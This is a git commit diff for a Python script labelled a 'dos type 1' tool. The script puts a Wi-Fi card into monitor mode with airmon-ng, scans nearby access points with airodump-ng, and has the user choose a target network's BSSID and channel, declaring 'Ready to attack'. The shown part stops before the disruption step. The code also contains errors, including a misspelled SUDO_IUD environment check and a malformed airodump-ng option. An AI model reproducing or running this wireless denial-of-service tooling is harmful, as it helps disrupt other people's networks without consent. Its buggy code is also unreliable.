fa8cc38fe02d669b295563767882096c6eeba40e
Domains18 <gibsonsgibson88@gmail.com>
2023-01-14 19:31:15 +0300

    dos type 1 script

--- Dos_type-1/dos_type1.py
+++ Dos_type-1/dos_type1.py
@@ -7,6 +7,8 @@ import shutil
 from datetime import datetime
 
 activeWirelessNetworks = []
+
+
 def checkForEssid(essid, lst):
     checkStatus = True
     if len(lst) == 0:
@@ -16,10 +18,11 @@ def checkForEssid(essid, lst):
             checkStatus = False
     return checkStatus
 
+
 if not "SUDO_IUD" in os.environ.keys():
     print("Access denied, Are you root?")
     exit()
-    
+
 for fileName in os.listdir():
     if ".csv" in fileName:
         directory = os.getcwd()
@@ -28,18 +31,20 @@ for fileName in os.listdir():
         except:
             print("Backup Folder Exists")
             timestamp = datetime.now()
-            shutil.move(fileName, directory + "/backup" + str(timestamp) + "-" + fileName)
-            
+            shutil.move(fileName, directory + "/backup" +
+                        str(timestamp) + "-" + fileName)
+
 wlanPattern = re.compile(r"wlan[0-9]")
-checkWifiResult = wlanPattern.findall(subprocess.run(["iw", "dev"], capture_output=True).stdout.decode())
+checkWifiResult = wlanPattern.findall(subprocess.run(
+    ["iw", "dev"], capture_output=True).stdout.decode())
 if len(checkWifiResult) == 0:
     print("No wifi card found")
     exit()
-    
+
 print("Select a wifi card to use:")
 for index, item in enumerate(checkWifiResult):
     print(f"{index} - {item}")
-    
+
 while True:
     wifiInterfaceChoice = input("Enter the interface to use: ")
     try:
@@ -48,10 +53,47 @@ while True:
             break
     except:
         print("Invalid choice")
-        
+
 hacknet = checkWifiResult[int(wifiInterfaceChoice)]
 
 print("Innitializing wifi card, Killing conflicting processes")
-killConflictingProcesses = subprocess.run(["sudo", "airmon-ng", "check", "kill", hacknet], capture_output=True)
-discoverAccessPoints = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "output-format", "csv", hacknet + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+killConflictingProcesses = subprocess.run(
+    ["sudo", "airmon-ng", "check", "kill", hacknet], capture_output=True)
+discoverAccessPoints = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1",
+                                        "output-format", "csv", hacknet + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+try:
+    while True:
+        subprocess.call("clear", shell=True)
+        for fileName in os.listdir():
+            fieldNames = ["BSSID", "First time seen", "Last time seen", "channel", "Speed", "Privacy",
+                          "Cipher", "Authentication", "Power", "beacons", "IV", "LAN IP", "ID-length", "ESSID", "Key"]
+            if ".csv" in fileName:
+                with open(fileName, "r") as file:
+                    reader = csv.DictReader(file, fieldnames=fieldNames)
+                    for row in reader:
+                        if row["BSSID"] == "BSSID":
+                            pass
+                        elif row["BSSID"] == "Station MAC":
+                            break
+                        elif checkForEssid(row["ESSID"], activeWirelessNetworks):
+                            activeWirelessNetworks.append(row)
+        for index, item in enumerate(activeWirelessNetworks):
+            print(
+                f"{index} - {item['ESSID']} - {item['BSSID']} - {item['Power']} - {item['channel']}")
+            time.sleep(1)
+except KeyboardInterrupt:
+    print("\n Ready to attack")
     
+
+while True:
+    try:
+        target = int(input("Enter the target number: "))
+        if activeWirelessNetworks[int(target)]:
+            break
+    except:
+        print("Invalid choice")
+        
+
+hackBssid =  activeWirelessNetworks[int(target)]["BSSID"]
+hackChannel = activeWirelessNetworks[int(target)]["channel"].strip()
